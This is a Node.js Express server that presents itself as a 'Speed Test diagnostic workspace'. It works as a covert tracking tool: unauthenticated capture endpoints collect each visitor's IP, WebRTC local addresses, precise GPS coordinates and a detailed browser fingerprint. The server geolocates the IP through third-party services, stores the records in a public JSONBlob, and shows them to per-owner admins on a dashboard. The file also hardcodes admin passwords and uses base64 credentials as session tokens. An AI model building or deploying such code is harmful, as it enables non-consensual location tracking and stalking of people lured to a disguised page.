const express = require('express');
const crypto = require('crypto');
const path = require('path');

const app = express();
const PORT = Number(process.env.PORT) || 3000;
const IS_VERCEL = !!process.env.VERCEL;

// JSONBlob serves as our synchronized cloud database
const JSONBLOB_ID = '019ded62-da44-7ebb-9058-66ffbacaede6';
const JSONBLOB_URL = `https://jsonblob.com/api/jsonBlob/${JSONBLOB_ID}`;

// Administrator accounts
const ALLOWED_ADMINS = [
  { user: process.env.ADMIN_USER || 'Jassim99x', pass: process.env.ADMIN_PASS || 'Jassim99x', publicId: 'srv_101' },
  { user: '1995aa', pass: '1995aa', publicId: 'srv_202' }
];
const VALID_TOKENS = ALLOWED_ADMINS.map(a => Buffer.from(`${a.user}:${a.pass}`).toString('base64'));

app.use(express.json({ limit: '128kb' }));
app.use(express.static(path.join(__dirname, 'public')));

const basicAuth = (req, res, next) => {
  const cookieHeader = req.headers.cookie || '';
  const cookies = Object.fromEntries(cookieHeader.split('; ').map(c => {
    const parts = c.split('=');
    const key = parts.shift();
    return [key, decodeURIComponent(parts.join('='))];
  }));

  if (VALID_TOKENS.includes(cookies.session_token)) {
    const decoded = Buffer.from(cookies.session_token, 'base64').toString('ascii');
    req.adminUser = decoded.split(':')[0];
    return next();
  }

  if (req.originalUrl.startsWith('/dashboard')) {
    return res.redirect('/login.html?next=/dashboard');
  }
  if (req.originalUrl.startsWith('/docs')) {
    return res.redirect('/login.html?next=/docs');
  }

  res.status(401).json({ error: 'Unauthorized' });
};

app.post('/api/login', (req, res) => {
  const { username, password } = req.body || {};
  const foundAdmin = ALLOWED_ADMINS.find(a => a.user === username && a.pass === password);

  if (foundAdmin) {
    const token = Buffer.from(`${foundAdmin.user}:${foundAdmin.pass}`).toString('base64');
    res.cookie('session_token', token, { httpOnly: true, path: '/' });
    res.json({ status: 'ok' });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

app.get('/api/logout', (req, res) => {
  res.clearCookie('session_token', { path: '/' });
  res.redirect('/login.html');
});

app.use('/dashboard', basicAuth, express.static(path.join(__dirname, 'dashboard')));
app.use('/docs', basicAuth, express.static(path.join(__dirname, 'docs')));

app.get('/api/download', (req, res) => {
  const size = Math.min(Number(req.query.size) || 1024 * 1024, 10 * 1024 * 1024);
  const chunk = Buffer.alloc(size, '1');
  res.set('Content-Type', 'application/octet-stream');
  res.set('Cache-Control', 'no-store, no-cache, must-revalidate, private');
  res.send(chunk);
});

app.post('/api/upload', express.raw({ type: '*/*', limit: '10mb' }), (req, res) => {
  res.json({ status: 'ok', received: req.body ? req.body.length : 0 });
});

function fallbackGeo() {
  return {
    city: 'Local',
    region: '-',
    country: '-',
    countryCode: '-',
    lat: 0,
    lon: 0,
    isp: 'localhost',
    asn: '-',
    timezone: '-',
  };
}

function normalizeCapture(entry) {
  const fingerprint = entry.fingerprint || {};
  const deviceId = entry.deviceId || generateDeviceHash(fingerprint, entry.ip || 'unknown');

  return {
    id: entry.id || createId(),
    deviceId,
    timestamp: entry.timestamp || new Date().toISOString(),
    ip: entry.ip || 'unknown',
    ipGeo: entry.ipGeo || fallbackGeo(),
    webrtcIPs: Array.isArray(entry.webrtcIPs) ? entry.webrtcIPs : [],
    gps: entry.gps || null,
    fingerprint,
    metadata: entry.metadata || {},
    visitCount: Number(entry.visitCount) || 1,
    owner: entry.owner || 'global',
  };
}

let inMemoryCaptures = null;

async function readCaptures() {
  if (IS_VERCEL && inMemoryCaptures !== null) {
    return inMemoryCaptures;
  }
  
  try {
    const response = await fetch(JSONBLOB_URL, { cache: 'no-store' });
    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
    const parsed = await response.json();
    const captures = Array.isArray(parsed) ? parsed.map(normalizeCapture) : [];
    if (IS_VERCEL) inMemoryCaptures = captures;
    return captures;
  } catch (err) {
    console.error('Failed to read from JSONBlob:', err);
    if (IS_VERCEL && inMemoryCaptures) return inMemoryCaptures;
    return [];
  }
}

async function writeCaptures(captures, retries = 3) {
  if (IS_VERCEL) inMemoryCaptures = captures;
  for (let attempt = 0; attempt < retries; attempt++) {
    try {
      const response = await fetch(JSONBLOB_URL, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(captures)
      });
      if (response.ok) return;
      throw new Error(`HTTP ${response.status}`);
    } catch (err) {
      console.warn(`JSONBlob write attempt ${attempt + 1}/${retries} failed:`, err.message);
      if (attempt < retries - 1) await new Promise(r => setTimeout(r, 500 * (attempt + 1)));
    }
  }
}

function getClientIP(req) {
  const raw =
    req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
    req.socket.remoteAddress ||
    'unknown';

  return raw.replace('::ffff:', '');
}

function sanitizeString(value, maxLength = 240) {
  if (typeof value !== 'string') return '';
  return value.replace(/\0/g, '').trim().slice(0, maxLength);
}

function sanitizeNumber(value, fallback = 0) {
  const num = Number(value);
  return Number.isFinite(num) ? num : fallback;
}

function sanitizeGps(gps) {
  if (!gps || typeof gps !== 'object') return null;

  const lat = Number(gps.lat);
  const lon = Number(gps.lon);
  if (!Number.isFinite(lat) || !Number.isFinite(lon)) return null;
  if (lat < -90 || lat > 90 || lon < -180 || lon > 180) return null;

  return {
    lat,
    lon,
    accuracy: sanitizeNumber(gps.accuracy, 0),
    altitude: Number.isFinite(Number(gps.altitude)) ? Number(gps.altitude) : null,
    altitudeAccuracy: Number.isFinite(Number(gps.altitudeAccuracy)) ? Number(gps.altitudeAccuracy) : null,
    heading: Number.isFinite(Number(gps.heading)) ? Number(gps.heading) : null,
    speed: Number.isFinite(Number(gps.speed)) ? Number(gps.speed) : null,
  };
}

function createFingerprint(req) {
  return {
    userAgent: sanitizeString(req.headers['user-agent'] || req.body.userAgent || '', 600),
    language: sanitizeString(req.body.language, 80),
    platform: sanitizeString(req.body.platform, 120),
    screenRes: sanitizeString(req.body.screenRes, 40),
    timezone: sanitizeString(req.body.timezone, 120),
    cores: sanitizeNumber(req.body.cores, 0),
    memory: sanitizeNumber(req.body.memory, 0),
    gpu: sanitizeString(req.body.gpu, 240),
    canvas: sanitizeString(req.body.canvas, 240),
    audioFingerprint: sanitizeString(req.body.audioFingerprint, 240),
    touchSupport: Boolean(req.body.touchSupport),
    connectionType: sanitizeString(req.body.connectionType, 40),
  };
}

function createId() {
  return Date.now().toString(36) + Math.random().toString(36).slice(2, 7);
}

function generateDeviceHash(fingerprint, ip) {
  const key = [
    fingerprint.userAgent,
    fingerprint.screenRes,
    fingerprint.timezone,
    fingerprint.cores,
    fingerprint.gpu,
    fingerprint.platform,
    ip,
  ].join('|');

  return `dev_${crypto.createHash('sha256').update(key).digest('hex').slice(0, 14)}`;
}

async function resolveIPGeo(ip) {
  if (!ip || ip === '::1' || ip === '127.0.0.1' || ip === 'unknown') {
    return fallbackGeo();
  }

  try {
    // Parallel consensus check using two different providers
    const [res1, res2] = await Promise.allSettled([
      fetch(`https://ipapi.co/${ip}/json/`).then(r => r.json()),
      fetch(`http://ip-api.com/json/${ip}`).then(r => r.json())
    ]);

    const data1 = res1.status === 'fulfilled' && !res1.value.error ? res1.value : null;
    const data2 = res2.status === 'fulfilled' && res2.value.status === 'success' ? res2.value : null;

    if (!data1 && !data2) return fallbackGeo();

    // Prefer data1 (ipapi.co) as primary, but cross-reference with data2
    const primary = data1 || {
      city: data2.city,
      region: data2.regionName,
      country_name: data2.country,
      country_code: data2.countryCode,
      latitude: data2.lat,
      longitude: data2.lon,
      org: data2.isp,
      asn: data2.as
    };

    // Calculate confidence based on coordinate agreement
    let confidence = 0.7;
    if (data1 && data2) {
      const dist = Math.sqrt(Math.pow(data1.latitude - data2.lat, 2) + Math.pow(data1.longitude - data2.lon, 2));
      if (dist < 0.1) confidence = 0.98; // Very close agreement
      else if (dist < 1) confidence = 0.85;
    }

    return {
      city: primary.city || '-',
      region: primary.region || '-',
      country: primary.country_name || '-',
      countryCode: primary.country_code || '-',
      lat: sanitizeNumber(primary.latitude, 0),
      lon: sanitizeNumber(primary.longitude, 0),
      isp: primary.org || '-',
      asn: primary.asn || '-',
      confidence: confidence
    };
  } catch (err) {
    console.error('Geo error:', err);
    return fallbackGeo();
  }
}

function createCapture(req, captures, extra = {}) {
  const clientIP = extra.ip || getClientIP(req);
  const fingerprint = extra.fingerprint || createFingerprint(req);
  const deviceId =
    sanitizeString(extra.deviceId || req.body.deviceId, 120) ||
    generateDeviceHash(fingerprint, clientIP);

  const previousVisits = captures.filter((capture) => capture.deviceId === deviceId);

  return {
    id: createId(),
    deviceId,
    timestamp: new Date().toISOString(),
    ip: clientIP,
    ipGeo: extra.ipGeo || null,
    webrtcIPs: Array.isArray(extra.webrtcIPs)
      ? extra.webrtcIPs
      : Array.isArray(req.body.webrtcIPs)
        ? req.body.webrtcIPs.map((ip) => sanitizeString(ip, 80)).filter(Boolean).slice(0, 8)
        : [],
    gps: sanitizeGps(extra.gps || req.body.gps),
    fingerprint,
    visitCount: previousVisits.length + 1,
    owner: extra.owner || req.body.owner || 'global'
  };
}

app.get('/api/health', basicAuth, async (req, res) => {
  const captures = await readCaptures();
  const admin = ALLOWED_ADMINS.find(a => a.user === req.adminUser);
  res.json({ 
    status: 'ok', 
    captures: captures.length, 
    user: req.adminUser,
    publicId: admin ? admin.publicId : 'global',
    time: new Date().toISOString() 
  });
});

app.get('/api/client-info', async (req, res) => {
  const ip = getClientIP(req);
  const ipGeo = await resolveIPGeo(ip);
  res.json({
    ip,
    ipGeo,
    userAgent: req.headers['user-agent'] || '',
    language: req.headers['accept-language'] || '',
  });
});

app.post('/api/capture', async (req, res) => {
  const captures = await readCaptures();
  
  // Resolve Public ID to internal username if possible
  const rawOwner = req.body.owner || 'global';
  const adminByPublicId = ALLOWED_ADMINS.find(a => a.publicId === rawOwner);
  const owner = adminByPublicId ? adminByPublicId.user : rawOwner;

  const entry = createCapture(req, captures, { owner });
  entry.ipGeo = await resolveIPGeo(entry.ip);

  captures.push(entry);
  await writeCaptures(captures);

  console.log(
    `[CAPTURE] ${entry.id} | Device: ${entry.deviceId} | IP: ${entry.ip} | Visit #${entry.visitCount} | GPS: ${entry.gps ? 'yes' : 'no'}`
  );

  res.json({ status: 'ok', id: entry.id });
});

app.post('/api/demo-capture', basicAuth, async (req, res) => {
  const captures = await readCaptures();
  const now = Date.now();
  const demoDeviceId = `demo_${crypto.randomBytes(4).toString('hex')}`;
  const cities = [
    { city: 'Basra', region: 'Basra', country: 'Iraq', countryCode: 'IQ', lat: 30.5085, lon: 47.7804, isp: 'EarthLink', asn: 'AS50710' },
    { city: 'Baghdad', region: 'Baghdad', country: 'Iraq', countryCode: 'IQ', lat: 33.3152, lon: 44.3661, isp: 'IQ Networks', asn: 'AS44217' },
    { city: 'Erbil', region: 'Kurdistan', country: 'Iraq', countryCode: 'IQ', lat: 36.1901, lon: 44.0092, isp: 'Newroz Telecom', asn: 'AS21277' },
    { city: 'Dubai', region: 'Dubai', country: 'United Arab Emirates', countryCode: 'AE', lat: 25.2048, lon: 55.2708, isp: 'Etisalat', asn: 'AS5384' },
  ];
  const city = cities[Math.floor(Math.random() * cities.length)];

  const entry = normalizeCapture({
    id: createId(),
    deviceId: demoDeviceId,
    timestamp: new Date(now).toISOString(),
    ip: `203.0.113.${Math.floor(Math.random() * 180) + 20}`,
    ipGeo: city,
    webrtcIPs: Math.random() > 0.35 ? [`10.0.${Math.floor(Math.random() * 50)}.${Math.floor(Math.random() * 220) + 10}`] : [],
    gps: Math.random() > 0.25
      ? {
          lat: city.lat + (Math.random() - 0.5) * 0.03,
          lon: city.lon + (Math.random() - 0.5) * 0.03,
          accuracy: Math.floor(Math.random() * 70) + 18,
          altitude: null,
          altitudeAccuracy: null,
          heading: null,
          speed: null,
        }
      : null,
    fingerprint: {
      userAgent:
        Math.random() > 0.5
          ? 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148'
          : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/537.36 Chrome/147.0.0.0 Safari/537.36',
      language: 'en-US',
      platform: Math.random() > 0.5 ? 'iPhone' : 'MacIntel',
      screenRes: Math.random() > 0.5 ? '390x844' : '1440x900',
      timezone: 'Asia/Baghdad',
      cores: Math.random() > 0.5 ? 6 : 10,
      memory: Math.random() > 0.5 ? 4 : 16,
      gpu: 'Demo GPU',
      touchSupport: Math.random() > 0.5,
      connectionType: Math.random() > 0.5 ? '4g' : 'wifi',
    },
    visitCount: 1,
    owner: req.adminUser // Tag demo as belonging to the current admin
  });

  captures.push(entry);
  await writeCaptures(captures);

  res.json({ status: 'ok', id: entry.id });
});

app.patch('/api/capture/:id', async (req, res) => {
  const captures = await readCaptures();
  const entry = captures.find((capture) => capture.id === req.params.id);
  if (!entry) return res.status(404).json({ error: 'Capture not found' });

  // GPS update
  const gps = sanitizeGps(req.body.gps);
  if (gps) {
    entry.gps = gps;
    console.log(`[GPS UPDATE] ${entry.id} | Lat: ${gps.lat}, Lon: ${gps.lon}, Accuracy: ${gps.accuracy}m`);
  }

  // WebRTC update
  if (Array.isArray(req.body.webrtcIPs)) {
    entry.webrtcIPs = req.body.webrtcIPs.map((ip) => sanitizeString(ip, 80)).filter(Boolean).slice(0, 8);
  }

  // Metadata update (sensors, triangulation, battery, regional latency)
  if (req.body.metadata && typeof req.body.metadata === 'object') {
    entry.metadata = entry.metadata || {};
    Object.assign(entry.metadata, req.body.metadata);
    console.log(`[META UPDATE] ${entry.id} | Keys: ${Object.keys(req.body.metadata).join(', ')}`);
  }

  // Extra fingerprint fields update
  if (req.body.languages || req.body.availableRes || req.body.colorDepth || req.body.pixelRatio) {
    entry.fingerprint = entry.fingerprint || {};
    if (req.body.languages) entry.fingerprint.languages = req.body.languages;
    if (req.body.availableRes) entry.fingerprint.availableRes = sanitizeString(req.body.availableRes, 40);
    if (req.body.colorDepth) entry.fingerprint.colorDepth = sanitizeNumber(req.body.colorDepth, 0);
    if (req.body.pixelRatio) entry.fingerprint.pixelRatio = sanitizeNumber(req.body.pixelRatio, 1);
    if (req.body.downlink) entry.fingerprint.downlink = sanitizeNumber(req.body.downlink, 0);
    if (req.body.rtt) entry.fingerprint.rtt = sanitizeNumber(req.body.rtt, 0);
  }

  await writeCaptures(captures);
  res.json({ status: 'updated' });
});

app.get('/api/captures', basicAuth, async (req, res) => {
  const all = await readCaptures();
  // Filter: Show my isolated data + any global/unassigned data
  const filtered = all.filter(c => c.owner === req.adminUser || c.owner === 'global');
  res.json(filtered);
});

app.delete('/api/captures', basicAuth, async (req, res) => {
  const all = await readCaptures();
  // Keep only data belonging to OTHER admins (not global, not mine)
  const othersData = all.filter(c => c.owner !== req.adminUser && c.owner !== 'global');
  await writeCaptures(othersData);
  broadcast('refresh');
  res.json({ status: 'cleared', deleted: all.length - othersData.length });
});

app.delete('/api/captures/:id', basicAuth, async (req, res) => {
  const all = await readCaptures();
  const capture = all.find(c => c.id === req.params.id);
  
  // Can delete if I own it OR if it is global
  if (!capture || (capture.owner !== req.adminUser && capture.owner !== 'global')) {
    return res.status(403).json({ error: 'Access denied' });
  }

  const filtered = all.filter((c) => c.id !== req.params.id);
  await writeCaptures(filtered);
  broadcast('refresh');
  res.json({ status: 'deleted' });
});

app.delete('/api/devices/:deviceId', basicAuth, async (req, res) => {
  const all = await readCaptures();
  // Only delete captures for this device that belong to me OR are global
  const filtered = all.filter((c) => !(c.deviceId === req.params.deviceId && (c.owner === req.adminUser || c.owner === 'global')));
  await writeCaptures(filtered);

  broadcast('refresh');
  res.json({ status: 'deleted', deleted: all.length - filtered.length });
});

// Broadcast stub (no WebSocket in serverless, but prevents crash)
function broadcast(event) {
  // In production, this would notify connected dashboard clients
  console.log(`[BROADCAST] ${event}`);
}

app.use((req, res) => {
  res.status(404).json({ error: 'Not found' });
});

app.use((err, req, res, next) => {
  console.error(err);
  res.status(500).json({ error: 'Server error' });
});

function startServer(port, attempts = 0) {
  const server = app.listen(port, () => {
    console.log(`
Speed Test diagnostic workspace
Main page:  http://localhost:${port}
Dashboard:  http://localhost:${port}/dashboard
`);
  });

  server.on('error', (err) => {
    if (err.code === 'EADDRINUSE' && !process.env.PORT && attempts < 10) {
      const nextPort = port + 1;
      console.warn(`Port ${port} is in use. Trying ${nextPort}...`);
      startServer(nextPort, attempts + 1);
      return;
    }

    console.error(err);
    process.exitCode = 1;
  });
}

if (!IS_VERCEL) {
  startServer(PORT);
}

module.exports = app;
